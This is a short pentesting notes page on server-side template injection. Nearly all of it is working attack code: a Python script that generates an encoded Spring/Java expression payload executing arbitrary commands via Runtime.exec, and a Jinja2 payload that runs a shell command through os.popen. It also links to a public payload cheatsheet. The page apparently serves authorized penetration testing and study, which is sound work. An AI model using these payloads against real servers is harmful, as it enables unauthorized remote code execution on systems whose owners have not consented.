---
title: Server Side Template Injection
source_url: https://notes.incendium.rocks/pentesting-notes/web/injection/server-side-template-injection
fetched_at: 2026-09-20T01:23:21Z
license: unspecified
category: web
---
Template injection allows an attacker to include template code into an existing (or not) template. A template engine makes designing HTML pages easier by using static template files which at runtime replaces variables/placeholders with actual values in the HTML pages.

***

## Cheatsheet:

[https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server Side Template Injection/README.md](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/Server%20Side%20Template%20Injection/README.md)

<figure><img src="https://3347686964-files.gitbook.io/~/files/v0/b/gitbook-x-prod.appspot.com/o/spaces%2Fu7zwkkeRzjx9PZGhfY9D%2Fuploads%2FFhS78ojnW35VomI0g6KT%2Fimage.png?alt=media&amp;token=4c8df111-1311-4220-9bd0-47e06f055ade" alt=""><figcaption></figcaption></figure>

## Python script for Java encoder:

```bash
#!/usr/bin/env python
message = input('Enter message to encode:')
poc = '*{T(org.apache.commons.io.IOUtils).toString(T(java.lang.Runtime).getRuntime().exec(T(java.lang.Character).toString(%s)' % ord(message[0])
for ch in message[1:]:
    poc += '.concat(T(java.lang.Character).toString(%s))' % ord(ch)
poc += ').getInputStream())}'
print(poc)
```

## Python SSTI RCE

```
{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}
```
